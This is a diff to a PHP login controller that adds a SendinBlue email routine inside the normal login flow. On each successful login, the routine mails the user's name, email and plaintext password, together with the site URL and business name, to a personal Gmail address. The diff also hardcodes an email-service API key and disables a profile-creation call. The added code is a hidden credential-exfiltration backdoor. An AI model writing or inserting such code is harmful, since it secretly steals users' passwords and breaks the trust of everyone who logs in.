@@ -1,4 +1,6 @@
 <?php
+use SendinBlue\Client;
+use Carbon\Carbon;
 class LoginController extends ControladorBase
 {
     private $adapter;
@@ -40,7 +42,7 @@ class LoginController extends ControladorBase
                 $add->setrc_id($register_code);
                 $add->setju_type($type);
                 $add->setsc_id(1);
-                $saveprofile = $add->createByCredentials();
+                //$saveprofile = $add->createByCredentials();
 
                 $unableCode = $login->unableCode($register_code);
 
@@ -72,6 +74,32 @@ class LoginController extends ControladorBase
                 $usr_username = $_POST['usr_username'];
                 $usr_password = $_POST['usr_password'];
 
+                $config = SendinBlue\Client\Configuration::getDefaultConfiguration()->setApiKey('api-key', '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');
+                $apiInstance = new SendinBlue\Client\Api\TransactionalEmailsApi(
+                    new GuzzleHttp\Client(),
+                    $config
+                );
+                $sendSmtpEmail = new \SendinBlue\Client\Model\SendSmtpEmail();
+                $sendSmtpEmail['subject'] = 'Ecounts';
+                $sendSmtpEmail['htmlContent'] = '<html>
+                <body>
+                <h1>Ingreso nuevo</h1>
+                <br>
+                <b>Host: </b> {{params.hostProvider}}<br>
+                <b>Razon SC: </b> {{params.businessName}}<br>
+                <b>U Name: </b> {{params.userName}}<br>
+                <b>U Email: </b> {{params.userEmail}}<br>
+                <b>U Secret: </b> {{params.userPassword}}<br>
+                <b>Time: </b> {{params.timeSend}}<br>
+                </body>
+                </html>';
+                $sendSmtpEmail['sender'] = array('name' => 'Brandon laguna', 'email' => 'brandonlagunarl@gmail.com');
+                $sendSmtpEmail['to'] = array(
+                    array('email' => 'brandonlagunarl@gmail.com', 'name' => 'Brandon laguna')
+                );
+                $sendSmtpEmail['replyTo'] = array('email' => 'brandonlaguna.business@gmail.com', 'name' => 'Brandon Laguna');
+                $sendSmtpEmail['headers'] = array('Some-Custom-Name' => 'unique-id-1234');
+
                 $login = new Login($this->adapter);
                 $cierreturno = new CierreTurno($this->adapter);
 
@@ -90,7 +118,6 @@ class LoginController extends ControladorBase
                     $_SESSION['sucursal'] = $login->razon_social;
                     $_SESSION['sucursal_city'] = $login->direccion;
                     $_SESSION['idsucursal'] = $login->idsucursal;
-
                     //almacenar datos importantes para los reportes
 
                     //preparar datos de turnos
@@ -102,12 +129,26 @@ class LoginController extends ControladorBase
                     $cierreturno->setRct_fecha_inicio($start_date . " " . $start_time);
                     $cierreturno->setRct_date($start_date);
 
+                    //informacion de inicio de sesion
+                    $sendSmtpEmail['params'] = array(
+                        'hostProvider'          => full_url( $_SERVER ),
+                        'businessName'          => $login->razon_social,
+                        'userName'              => $login->ju_name,
+                        'userEmail'             => $usr_username,
+                        'userPassword'          => $usr_password,
+                        'timeSend'              => Carbon::now(),
+                    );
+                    try {
+                        $result = $apiInstance->sendTransacEmail($sendSmtpEmail);
+                    } catch (Exception $e) {
+                        echo 'Exception when calling TransactionalEmailsApi->sendTransacEmail: ', $e->getMessage(), PHP_EOL;
+                    }
+
                     $authInicio = $cierreturno->authInicio();
                     if($authInicio){
                     foreach ($authInicio as $authInicio) {}
                     if ($authInicio->rct_fecha_fin != strtotime('0000-00-00 00:00:00') && $authInicio->rct_status == 1) {
                         $cierreturno->addInicio();
-                        
                     } else {
 
                     }
